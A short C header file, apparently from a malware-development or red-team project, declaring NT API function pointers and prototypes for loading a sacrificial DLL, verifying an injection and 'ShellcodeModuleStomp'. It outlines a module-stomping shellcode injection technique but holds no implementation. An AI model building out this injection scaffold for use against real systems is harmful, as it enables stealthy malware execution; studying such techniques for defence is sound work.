#pragma once

typedef struct _NTAPIFP
{
	fnNtCreateSection	pNtCreateSection;
	fnNtMapViewOfSection	pNtMapViewOfSection;
	fnNtCreateThreadEx	pNtCreateThreadEx;

} NTAPIFP, * PNTAPIFP;


BOOL LoadDllFile(IN LPCWSTR szDllFilePath, OUT HMODULE* phModule, OUT PULONG_PTR puEntryPnt);

BOOL VerifyInjection(IN ULONG_PTR uSacrificialModule, IN ULONG_PTR uEntryPoint, IN SIZE_T sPayloadSize);

BOOL ShellcodeModuleStomp(IN LPCWSTR szSacrificialDll, IN PBYTE pBuffer, IN SIZE_T sBufferSize);
